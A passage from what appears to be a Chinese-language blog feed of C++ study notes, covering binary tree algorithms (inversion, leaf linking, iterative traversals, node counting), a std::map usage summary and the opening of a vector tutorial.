class="comment">//递归左子树</span></span><br><span class="line">    invertTree(b-&gt;rchild);      <span class="comment">//递归右子树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//将二叉树的叶子节点按照从左到右的顺序连成一个单链表，表头指针为head</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">linkLeafNode</span><span class="params">(BTNode* p, BTNode*&amp; head, BTNode*&amp; tail)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;<span class="comment">//边界条件</span></span><br><span class="line">        <span class="comment">//判断是否是叶子节点</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;lchild == <span class="literal">NULL</span> &amp;&amp; p-&gt;rchild == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;<span class="comment">//还没有填元素</span></span><br><span class="line">                head = p;<span class="comment">//头</span></span><br><span class="line">                tail = p;<span class="comment">//尾</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                tail-&gt;rchild = p;<span class="comment">//不是叶子节点，tail右孩子指向p</span></span><br><span class="line">                tail = p; <span class="comment">//尾巴指向p</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        linkLeafNode(p-&gt;lchild, head, tail);<span class="comment">//从左到右</span></span><br><span class="line">        linkLeafNode(p-&gt;rchild, head, tail);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* str = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(1),输入二叉树的元素：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);<span class="comment">// A(B(D,E),C(F,G))</span></span><br><span class="line">    <span class="comment">//printf(&quot;%s&quot;,str);</span></span><br><span class="line"></span><br><span class="line">    BTNode* btnode;</span><br><span class="line">    BTNode* head, * tail;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(2),创建二叉树：\n&quot;</span>);</span><br><span class="line">    CreateBTNode(btnode, str);</span><br><span class="line">    DispBTNode(btnode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;\n层次遍历：\n&quot;);</span></span><br><span class="line">    <span class="comment">//LevelOrder(btnode);</span></span><br><span class="line">    <span class="comment">//head = tail = NULL;</span></span><br><span class="line">    <span class="comment">//linkLeafNode(btnode,head,tail);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;\n叶子节点如下所示：\n&quot;);</span></span><br><span class="line">    <span class="comment">//LevelOrder(head);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*if (IsComplete(btnode)) &#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n该二叉树是完全二叉树！\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else &#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n该二叉树不是完全二叉树！\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n(3),翻转二叉树:\n&quot;</span>);</span><br><span class="line">    invertTree(btnode);</span><br><span class="line">    DispBTNode(btnode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="先序遍历-非递归实现，栈"><a href="#先序遍历-非递归实现，栈" class="headerlink" title="先序遍历,非递归实现，栈"></a>先序遍历,非递归实现，栈</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*先序遍历,非递归实现，栈*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrderl</span><span class="params">(BTNode* b)</span> </span>&#123;</span><br><span class="line">    BTNode* p;</span><br><span class="line">    stack&lt;BTNode*&gt; myStack; <span class="comment">//定义栈</span></span><br><span class="line">    <span class="keyword">if</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        myStack.<span class="built_in">push</span>(b);  <span class="comment">//根节点进栈</span></span><br><span class="line">        <span class="keyword">while</span> (!myStack.<span class="built_in">empty</span>())  <span class="comment">//栈不空时循环</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = myStack.<span class="built_in">top</span>(); <span class="comment">//退栈节点p并访问它</span></span><br><span class="line">            myStack.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, p-&gt;data);</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;rchild != <span class="literal">NULL</span>)  <span class="comment">//有右孩子时将其进栈</span></span><br><span class="line">                myStack.<span class="built_in">push</span>(p-&gt;rchild);</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;lchild != <span class="literal">NULL</span>)<span class="comment">//有左孩子时将其进栈</span></span><br><span class="line">                myStack.<span class="built_in">push</span>(p-&gt;lchild);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="三种遍历-迭代"><a href="#三种遍历-迭代" class="headerlink" title="三种遍历-迭代"></a>三种遍历-迭代</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前序遍历</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">preOrderIteration</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    stack&lt;TreeNode*&gt; stack;</span><br><span class="line">    stack.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span> (!stack.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        TreeNode* temp = stack.<span class="built_in">top</span>(); stack.<span class="built_in">pop</span>();</span><br><span class="line">        cout &lt;&lt; temp-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (temp-&gt;right != <span class="literal">nullptr</span>)stack.<span class="built_in">push</span>(temp-&gt;right);</span><br><span class="line">        <span class="keyword">if</span> (temp-&gt;left != <span class="literal">nullptr</span>)stack.<span class="built_in">push</span>(temp-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inOrderIteration</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode* cur = root;</span><br><span class="line">    stack&lt;TreeNode*&gt; stack;</span><br><span class="line">    <span class="keyword">while</span> (!stack.<span class="built_in">empty</span>() || cur != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            stack.<span class="built_in">push</span>(cur);</span><br><span class="line">            cur = cur-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode* node = stack.<span class="built_in">top</span>(); stack.<span class="built_in">pop</span>();</span><br><span class="line">        cout &lt;&lt; node-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            cur = node-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后序遍历</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">postOrderIteration</span><span class="params">(TreeNode* head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stack&lt;TreeNode*&gt; stack1;</span><br><span class="line">    stack&lt;TreeNode*&gt; stack2;</span><br><span class="line">    stack1.<span class="built_in">push</span>(head);</span><br><span class="line">    <span class="keyword">while</span> (!stack1.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        TreeNode* node = stack1.<span class="built_in">top</span>(); stack1.<span class="built_in">pop</span>();</span><br><span class="line">        stack2.<span class="built_in">push</span>(node);</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            stack1.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            stack1.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stack2.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; stack2.<span class="built_in">top</span>()-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        stack2.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例-7-11-计算节点个数"><a href="#例-7-11-计算节点个数" class="headerlink" title="例 7.11 计算节点个数"></a>例 7.11 计算节点个数</h3><p><img src="https://onedrive.live.com/embed?resid=1D77EFE2DBD1006F!189&authkey=!AE9bgoDAfWUslDc" alt="1589587621308.png"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Nodes</span><span class="params">(BTNode *b)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num1, num2;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">Nodes</span>(b-&gt;lchild) +<span class="built_in">Nodes</span>(b-&gt;rchild)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例-7-12-输出叶子节点"><a href="#例-7-12-输出叶子节点" class="headerlink" title="例 7.12 输出叶子节点"></a>例 7.12 输出叶子节点</h3><p>[例7.12]假设二叉树采用二叉链存储结构存储，试设计一个算法，输出一棵给定二叉树的所有叶子结点。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从左到右输出</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DispLeaf</span><span class="params">(BTNode *b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b-&gt;lchild == <span class="literal">NULL</span> &amp;&amp; b-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,b-&gt;data);</span><br><span class="line">        <span class="built_in">DispLeaf</span>(b-&gt;lchild);</span><br><span class="line">        <span class="built_in">DispLeaf</span>(b-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从右到左输出</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DispLeaf1</span><span class="params">(BTNode* b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b-&gt;lchild == <span class="literal">NULL</span> &amp;&amp; b-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, b-&gt;data);</span><br><span class="line">        <span class="built_in">DispLeaf1</span>(b-&gt;rchild);</span><br><span class="line">        <span class="built_in">DispLeaf1</span>(b-&gt;lchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例-7-13-求节点值-x-节点所在层次"><a href="#例-7-13-求节点值-x-节点所在层次" class="headerlink" title="例 7.13 求节点值 x 节点所在层次"></a>例 7.13 求节点值 x 节点所在层次</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*x,要查的节点值，h高度默认为1*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Level</span><span class="params">(BTNode *b,ElemType x,<span class="type">int</span> h=<span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> L;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (b-&gt;data == x)<span class="keyword">return</span> h;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        L = <span class="built_in">Level</span>(b-&gt;lchild,x,h+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (L != <span class="number">0</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">Level</span>(b-&gt;rchild,x,h+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例-7-14-求第-k-层节点个数"><a href="#例-7-14-求第-k-层节点个数" class="headerlink" title="例 7.14 求第 k 层节点个数"></a>例 7.14 求第 k 层节点个数</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*基于先序遍历思路*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Lnodenum</span><span class="params">(BTNode *b,<span class="type">int</span> h,<span class="type">int</span> k,<span class="type">int</span> &amp;n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b==<span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (h == k)n++;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (h&lt;k) &#123;</span><br><span class="line">            <span class="built_in">Lnodenum</span>(b-&gt;lchild,h+<span class="number">1</span>,k,n);</span><br><span class="line">            <span class="built_in">Lnodenum</span>(b-&gt;rchild,h+<span class="number">1</span>,k,n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*使用全局变量*/</span></span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Lnodenum</span><span class="params">(BTNode* b, <span class="type">int</span> h, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (h == k)n++;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (h &lt; k) &#123;</span><br><span class="line">            <span class="built_in">Lnodenum</span>(b-&gt;lchild, h + <span class="number">1</span>, k);</span><br><span class="line">            <span class="built_in">Lnodenum</span>(b-&gt;rchild, h + <span class="number">1</span>, k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ map用法总结（整理）</title>
    <url>/2021/05/15/C++%20map%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88%E6%95%B4%E7%90%86%EF%BC%89/</url>
    <content><![CDATA[<h1 id="C-map-用法总结（整理）"><a href="#C-map-用法总结（整理）" class="headerlink" title="C++ map 用法总结（整理）"></a>C++ map 用法总结（整理）</h1><h2 id="1，map-简介"><a href="#1，map-简介" class="headerlink" title="1，map 简介"></a>1，map 简介</h2><p>map 是 STL 的一个关联容器，它提供一对一的 hash。</p>
<p>第一个可以称为关键字(key)，每个关键字只能在 map 中出现一次；</p>
<p>第二个可能称为该关键字的值(value)；</p>
<p>map 以模板(泛型)方式实现，可以存储任意类型的数据，包括使用者自定义的数据类型。Map 主要用于资料一对一映射(one-to-one)的情況，map 內部的实现自建一颗红黑树，这颗树具有对数据自动排序的功能。在 map 内部所有的数据都是有序的，后边我们会见识到有序的好处。比如一个班级中，每个学生的学号跟他的姓名就存在著一对一映射的关系。</p>
<h2 id="2，map-的功能"><a href="#2，map-的功能" class="headerlink" title="2，map 的功能"></a>2，map 的功能</h2><p>自动建立 key － value 的对应。key 和 value 可以是任意你需要的类型。</p>
<h2 id="3，使用-map"><a href="#3，使用-map" class="headerlink" title="3，使用 map"></a>3，使用 map</h2><p>使用 map 得包含 map 类所在的头文件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span> <span class="comment">//注意，STL头文件没有扩展名.h</span></span></span><br></pre></td></tr></table></figure>

<p>map 对象是模板类，需要关键字和存储对象两个模板参数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std:map&lt;<span class="type">int</span>, string&gt; personnel;</span><br></pre></td></tr></table></figure>

<p>这样就定义了一个用 int 作为索引,并拥有相关联的指向 string 的指针.</p>
<p>为了使用方便，可以对模板类进行一下类型定义，</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> map&lt;<span class="type">int</span>,CString&gt; UDT_MAP_INT_CSTRING;</span><br><span class="line">UDT_MAP_INT_CSTRING enumMap;</span><br></pre></td></tr></table></figure>

<h2 id="4，map-的构造函数"><a href="#4，map-的构造函数" class="headerlink" title="4，map 的构造函数"></a>4，map 的构造函数</h2><p>map 共提供了 6 个构造函数，这块涉及到内存分配器这些东西，略过不表，在下面我们将接触到一些 map 的构造方法，这里要说下的就是，我们通常用如下方法构造一个 map：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">map&lt;<span class="type">int</span>, string&gt; mapStudent;</span><br></pre></td></tr></table></figure>

<h2 id="5，插入元素"><a href="#5，插入元素" class="headerlink" title="5，插入元素"></a>5，插入元素</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个map对象</span></span><br><span class="line">map&lt;<span class="type">int</span>, string&gt; mapStudent;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一种 用insert函數插入pair</span></span><br><span class="line">mapStudent.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, string&gt;(<span class="number">000</span>, <span class="string">&quot;student_zero&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种 用insert函数插入value_type数据</span></span><br><span class="line">mapStudent.<span class="built_in">insert</span>(map&lt;<span class="type">int</span>, string&gt;::<span class="built_in">value_type</span>(<span class="number">001</span>, <span class="string">&quot;student_one&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三种 用&quot;array&quot;方式插入</span></span><br><span class="line">mapStudent[<span class="number">123</span>] = <span class="string">&quot;student_first&quot;</span>;</span><br><span class="line">mapStudent[<span class="number">456</span>] = <span class="string">&quot;student_second&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>以上三种用法，虽然都可以实现数据的插入，但是它们是有区别的，当然了第一种和第二种在效果上是完成一样的，用 insert 函数插入数据，在数据的 插入上涉及到集合的唯一性这个概念，即当 map 中有这个关键字时，insert 操作是不能在插入数据的，但是用数组方式就不同了，它可以覆盖以前该关键字对 应的值，用程序说明如下：</p>
<p>&#x2F;&#x2F; 第三种 用”array”方式插入</p>
<p>mapStudent[123] &#x3D; “student_first”;</p>
<p>mapStudent[456] &#x3D; “student_second”;</p>
<p>以上三种用法，虽然都可以实现数据的插入，但是它们是有区别的，当然了第一种和第二种在效果上是完成一样的，用 insert 函数插入数据，在数据的 插入上涉及到集合的唯一性这个概念，即当 map 中有这个关键字时，insert 操作是不能在插入数据的，但是用数组方式就不同了，它可以覆盖以前该关键字对 应的值，用程序说明如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mapStudent.<span class="built_in">insert</span>(map&lt;<span class="type">int</span>, string&gt;::<span class="built_in">value_type</span> (<span class="number">001</span>, <span class="string">&quot;student_one&quot;</span>));</span><br><span class="line"></span><br><span class="line">mapStudent.<span class="built_in">insert</span>(map&lt;<span class="type">int</span>, string&gt;::<span class="built_in">value_type</span> (<span class="number">001</span>, <span class="string">&quot;student_two&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>上面这两条语句执行后，map 中 001 这个关键字对应的值是“student_one”，第二条语句并没有生效，那么这就涉及到我们怎么知道 insert 语句是否插入成功的问题了，可以用 pair 来获得是否插入成功，程序如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造定义，返回一个pair对象</span></span><br><span class="line"><span class="function">pair&lt;iterator,<span class="type">bool</span>&gt; <span class="title">insert</span> <span class="params">(<span class="type">const</span> value_type&amp; val)</span></span>;</span><br><span class="line"></span><br><span class="line">pair&lt;map&lt;<span class="type">int</span>, string&gt;::iterator, <span class="type">bool</span>&gt; Insert_Pair;</span><br><span class="line"></span><br><span class="line">Insert_Pair = mapStudent.<span class="built_in">insert</span>(map&lt;<span class="type">int</span>, string&gt;::<span class="built_in">value_type</span> (<span class="number">001</span>, <span class="string">&quot;student_one&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!Insert_Pair.second)</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;&quot;</span>Error insert <span class="keyword">new</span> element<span class="string">&quot; &lt;&lt; endl;</span></span><br></pre></td></tr></table></figure>

<p>我们通过 pair 的第二个变量来知道是否插入成功，它的第一个变量返回的是一个 map 的迭代器，如果插入成功的话 Insert_Pair.second 应该是 true 的，否则为 false。</p>
<h2 id="6，-查找元素"><a href="#6，-查找元素" class="headerlink" title="6， 查找元素"></a>6， 查找元素</h2><p>当所查找的关键 key 出现时，它返回数据所在对象的位置，如果沒有，返回 iter 与 end 函数的值相同。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// find 返回迭代器指向当前查找元素的位置否则返回map::end()位置</span></span><br><span class="line">iter = mapStudent.<span class="built_in">find</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(iter != mapStudent.<span class="built_in">end</span>())</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Find, the value is&quot;</span>&lt;&lt;iter-&gt;second&lt;&lt;endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  cout&lt;&lt;<span class="string">&quot;Do not Find&quot;</span>&lt;&lt;endl;</span><br></pre></td></tr></table></figure>

<h2 id="7，-刪除与清空元素"><a href="#7，-刪除与清空元素" class="headerlink" title="## 7， 刪除与清空元素"></a>## 7， 刪除与清空元素</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//迭代器刪除</span></span><br><span class="line">iter = mapStudent.<span class="built_in">find</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">mapStudent.<span class="built_in">erase</span>(iter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//用关键字刪除</span></span><br><span class="line"><span class="type">int</span> n = mapStudent.<span class="built_in">erase</span>(<span class="string">&quot;123&quot;</span>); <span class="comment">//如果刪除了會返回1，否則返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//用迭代器范围刪除 : 把整个map清空</span></span><br><span class="line">mapStudent.<span class="built_in">erase</span>(mapStudent.<span class="built_in">begin</span>(), mapStudent.<span class="built_in">end</span>());</span><br><span class="line"><span class="comment">//等同于mapStudent.clear()</span></span><br></pre></td></tr></table></figure>

<p>8，map 的大小</p>
<p>在往 map 里面插入了数据，我们怎么知道当前已经插入了多少数据呢，可以用 size 函数，用法如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> nSize = mapStudent.<span class="built_in">size</span>();</span><br></pre></td></tr></table></figure>

<p>9，map 的基本操作函数：</p>
<p>C++ maps 是一种关联式容器，包含“关键字&#x2F;值”对</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">begin</span>()     返回指向map头部的迭代器</span><br><span class="line"></span><br><span class="line"><span class="built_in">clear</span>(）    删除所有元素</span><br><span class="line"></span><br><span class="line"><span class="built_in">count</span>()     返回指定元素出现的次数</span><br><span class="line"></span><br><span class="line"><span class="built_in">empty</span>()     如果map为空则返回<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">end</span>()      返回指向map末尾的迭代器</span><br><span class="line"></span><br><span class="line"><span class="built_in">equal_range</span>()  返回特殊条目的迭代器对</span><br><span class="line"></span><br><span class="line"><span class="built_in">erase</span>()     删除一个元素</span><br><span class="line"></span><br><span class="line"><span class="built_in">find</span>()     查找一个元素</span><br><span class="line"></span><br><span class="line"><span class="built_in">get_allocator</span>() 返回map的配置器</span><br><span class="line"></span><br><span class="line"><span class="built_in">insert</span>()    插入元素</span><br><span class="line"></span><br><span class="line"><span class="built_in">key_comp</span>()   返回比较元素key的函数</span><br><span class="line"></span><br><span class="line"><span class="built_in">lower_bound</span>()  返回键值&gt;=给定元素的第一个位置</span><br><span class="line"></span><br><span class="line"><span class="built_in">max_size</span>()   返回可以容纳的最大元素个数</span><br><span class="line"></span><br><span class="line"><span class="built_in">rbegin</span>()    返回一个指向map尾部的逆向迭代器</span><br><span class="line"></span><br><span class="line"><span class="built_in">rend</span>()     返回一个指向map头部的逆向迭代器</span><br><span class="line"></span><br><span class="line"><span class="built_in">size</span>()     返回map中元素的个数</span><br><span class="line"></span><br><span class="line"><span class="built_in">swap</span>()      交换两个map</span><br><span class="line"></span><br><span class="line"><span class="built_in">upper_bound</span>()  返回键值&gt;给定元素的第一个位置</span><br><span class="line"></span><br><span class="line"><span class="built_in">value_comp</span>()   返回比较元素value的函数</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++_vector操作</title>
    <url>/2021/05/15/C++_vector%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="C-vector-操作"><a href="#C-vector-操作" class="headerlink" title="C++_vector 操作"></a>C++_vector 操作</h1><h2 id="1-vector："><a href="#1-vector：" class="headerlink" title="1. vector："></a>1. vector：</h2><h4 id="1-1-vector-说明"><a href="#1-1-vector-说明" class="headerlink" title="1.1 vector 说明"></a>1.1 vector 说明</h4><ul>
<li>vector 是向量类型，可以容纳许多类型的数据，因此也被称为容器</li>
<li>(可以理解为动态数组，是封装好了的类）</li>
<li>进行<code>vector</code>操作前应添加头文件<code>#include</code></li>
</ul>
<h4 id="1-2-vector-初始化："><a href="#1-2-vector-初始化：" class="headerlink" title="1.2 vector 初始化："></a>1.2 vector 初始化：</h4><p><strong>方式 1.</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义具有10个整型元素的向量（尖括号为元素类型名，它可以是任何合法的数据类型），不具有初值，其值不确定</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">a</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<p><strong>方式 2.</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义具有10个整型元素的向量，且给出的每个元素初值为1</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">a</span>(<span class="number">10</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p><strong>方式 3.</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用向量b给向量a赋值，a的值完全等价于b的值</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">a</span>(b);</span><br></pre></td></tr></table></figure>

<p><strong>方式 4</strong>.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将向量b中从0-2（共三个）的元素赋值给a，a的类型为int型</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">a</span>(b.<span class="built_in">begin</span>(),b.begin+<span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p><strong>方式 5.</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//从数组中获得初值</span></span><br><span class="line"><span class="type">int</span> b[<span class="number">7</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(b,b+<span class="number">7</span>）;</span></span></span><br></pre></td></tr></table></figure>

